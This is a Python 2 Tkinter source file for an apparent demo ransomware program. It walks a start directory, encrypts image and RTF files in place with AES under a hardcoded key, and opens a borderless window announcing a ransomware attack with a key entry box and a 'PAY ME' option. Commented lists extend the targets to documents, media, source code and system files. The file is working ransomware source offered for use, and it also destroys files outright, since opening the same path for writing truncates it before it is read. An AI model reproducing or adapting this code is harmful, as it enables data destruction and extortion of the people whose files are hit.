import tkMessageBox
import ttk
from Tkinter import *
from PIL import Image, ImageTk
import time
import sys
import os, random
from Crypto.Cipher import AES
from Crypto.Hash import SHA256
from myimages import *
pic=imageString#GIF decoded to string. imageString from myimages.py


def encrypt(key, filename):
    chunksize = 64*1024
    outputFile = filename
    filesize = str(os.path.getsize(filename)).zfill(16)
    IV = ''

    for i in range(16):
        IV += chr(random.randint(0,0xFF))

    encryptor = AES.new(key, AES.MODE_CBC, IV)

    with open(filename, 'rb') as infile:
        with open(outputFile, 'wb') as outfile:
            outfile.write(filesize)
            outfile.write(IV)

            while True:
                chunk = infile.read(chunksize)

                if len(chunk) == 0:
                    break
                elif len(chunk) % 16 !=  0:
                    chunk += ' ' *  (16 - (len(chunk) % 16))

                outfile.write(encryptor.encrypt(chunk))

def decscan(password):
    for currentDir in startdirs:
        for file in discoverFiles(currentDir):
            decrypt(getKey(password), file)

def decrypt(key, filename):
    chunksize = 64*1024
    outputFile = filename

    with open(filename, 'rb') as infile:
        filesize = long(infile.read(16))
        IV = infile.read(16)

        decryptor = AES.new(key, AES.MODE_CBC, IV)

        with open(outputFile, 'wb') as outfile:
            while True:
                chunk = infile.read(chunksize)

                if len(chunk) == 0:
                    break

                outfile.write(decryptor.decrypt(chunk))
            outfile.truncate(filesize)

def getKey(password):
    hasher = SHA256.new(password)
    return hasher.digest()

def discoverFiles(startpath):

    # This is a file extension list of all files that may want to be encrypted.
    # They are grouped by category. If a category is not wanted, Comment that line.
    # All files uncommented by default should be harmless to the system
    # that is: Encrypting all files of all the below types should leave a system in a bootable state,
    # BUT applications which depend on such resources may become broken.
    # This will not cover all files, but it should be a decent range.
    extensions = [
        # 'exe,', 'dll', 'so', 'rpm', 'deb', 'vmlinuz', 'img',  # SYSTEM FILES - BEWARE! MAY DESTROY SYSTEM!
        'jpg', 'jpeg', #'bmp', 'gif', 'png', 'svg', 'psd', 'raw', # images
        #'mp3','mp4', 'm4a', 'aac','ogg','flac', 'wav', 'wma', 'aiff', 'ape', # music and sound
        #'avi', 'flv', 'm4v', 'mkv', 'mov', 'mpg', 'mpeg', 'wmv', 'swf', '3gp', # Video and movies
        #'doc', 'docx', 'xls', 'xlsx', 'ppt','pptx', # Microsoft office
        #'odt', 'odp', 'ods', 'txt', 'rtf', 'tex', 'pdf', 'epub', 'md', # OpenOffice, Adobe, Latex, Markdown, etc
        #'yml', 'yaml', 'json', 'xml', 'csv', # structured data
        #'db', 'sql', 'dbf', 'mdb', 'iso', # databases and disc images
        'rtf',
        #'html', 'htm', 'xhtml', 'php', 'asp', 'aspx', 'js', 'jsp', 'css', # web technologies
        #'c', 'cpp', 'cxx', 'h', 'hpp', 'hxx', # C source code
        #'java', 'class', 'jar', # java source code
        #'ps', 'bat', 'vb', # windows based scripts
        #'awk', 'sh', 'cgi', 'pl', 'ada', 'swift', # linux/mac based scripts
        #'go', 'py', 'pyc', 'bf', 'coffee', # other source code files

        #'zip', 'tar', 'tgz', 'bz2', '7z', 'rar', 'bak',  # compressed formats
    ]

    for dirpath, dirs, files in os.walk(startpath):
        for i in files:
            absolute_path = os.path.abspath(os.path.join(dirpath, i))
            ext = absolute_path.split('.')[-1]
            if ext in extensions:
                yield absolute_path

#def resource_path(relative_path):
    """ Get absolute path to resource, works for dev and for PyInstaller """
 #   try:
        # PyInstaller creates a temp folder and stores path in _MEIPASS
  #      base_path = sys._MEIPASS
   # except Exception:
    #    base_path = os.path.abspath(".")

    #return os.path.join(base_path, relative_path)



# Main part of the program that has the background and window sizes
root = Tk()
root.geometry("900x600")
root.title("This is a RansomWare Attack")
root.configure(background="black")
root.overrideredirect(True)
tempkey = "Q1W2E3R4T5Y6U7I8O9P0123"
startdirs = ["/Users/test/Desktop/test"] #Where to start the file search
def start():
    for currentDir in startdirs:
        for file in discoverFiles(currentDir):
            encrypt(getKey(tempkey), file)

def submit_function():
    count = 0
    while count < 1:
            tkMessageBox.showinfo("CHECKING KEY...", "FILES NOW DECRYPTED. THANK YOU!!!")
            count += 1
    exit()

def Messages():
    global entering
    string = entering.get()
    if string == tempkey:

        print string
        tkMessageBox.showinfo("Checker", "YOUR FILES ARE NOW SAFE. THANK YOU!!!")
        decscan(string)
        exit()
    else:
        tkMessageBox.showerror("ERROR", "Your Key Entered Is Not Correct!! REMOVING TIME!!")


def submit_denied():
    tkMessageBox.showinfo("ACCESS DENIED", "KEY NOT VALID. TRY AGAIN!!!!")

def countdown_timer(self):
    counter = 25
 #   while counter > 0:

def ListRandomNumbers():
    scrolling = Scrollbar(root).place(x=100, y=70, height=350)
    ListBoxText = Listbox(root, height=2, width=15, bg="RED")
    ListBoxText.place(x=1, y=70)
    ListBoxText.insert(0, "000110101101010")
    ListBoxText.insert(0, "001010101001010")
    ListBoxText.insert(0, "110100101010010")
    #ListBoxText.insert(0, "42  70")
    #ListBoxText.place(x=3, y=70)
    #for random_numbers in [ListBoxText]:
        #ListBoxText.insert(END, random_numbers)


#This is the main banner at the top of the page
FirstHeading = Label(root, relief="raised", text="THIS IS A RANSOMWARE ATTACK ", font=("helvetica", 40, "bold"), bg="PURPLE",
                     fg="RED").pack()
#This is the text and submit box for the program
entering = Entry(root, width=80, relief="sunken")
entering.place(x=250, y=500, height=28)
entering.focus_set()

#SUBMIT button that is listening to a users actions
button1 = Button(root, text="SUBMIT", fg="BLUE", relief="raised", command=Messages,
            bg="RED").place(x=750, y=500)

#COUNTDOWNTIMER
timer = Label(root, font=("ARIAL", 40, "bold"), bg="RED", width=14).place(x=250, y=448, height=45)

#This is where the layers are for the designed image
ListRandomNumbers()

#CODE to display the description
#DescriptionImage = Image.open(resource_path('Capture.gif'))
tkimage = PhotoImage(data=pic)
LabelIt = Label(root, image=tkimage, relief="sunken").pack()

#Bitcoin Image
#BitcoinImage = Image.open(resource_path('bitcoin.png'))
#BC = ImageTk.PhotoImage(BitcoinImage)
#LabelIt2 = Label(root, image=BC, height=100)
#LabelIt2.place(x=200, y=535)

#These are to display the check button boxes
Chooser = Checkbutton(root, bg="BLUE", text="DECRYPT YOUR FILES").place(x=25, y=500)
Chooser2 = Checkbutton(root, bg="BLUE", text="AVOID BRICKING SYSTEM").place(x=25, y=520)
Chooser3 = Checkbutton(root, bg="BLUE", text="PAY ME").place(x=25, y=540)
#update_time()





#def Main():
    
    
 #   choice = raw_input("Would you like to (E)ncrypt or (D)ecrypt?: ")
  #  if choice == 'E':
        #filename = raw_input("File to encrypt: ")
   #     password = raw_input("Password: ")
         #    for currentDir in startdirs:
     #       for file in discoverFiles(currentDir):
      #          encrypt(getKey(password), file)
   
       # print "Done."

#    elif choice == 'D':
 #       #filename = raw_input("File to decrypt: ")
  #      password = raw_input("Password: ")
   #     for currentDir in startdirs:
    #        for file in discoverFiles(currentDir):
     #           decrypt(getKey(password), file)
      #  print "Done."
    #else:
     #   print "No option selected. Closing..."

        


if __name__ == '__main__':
    start()


root.mainloop()
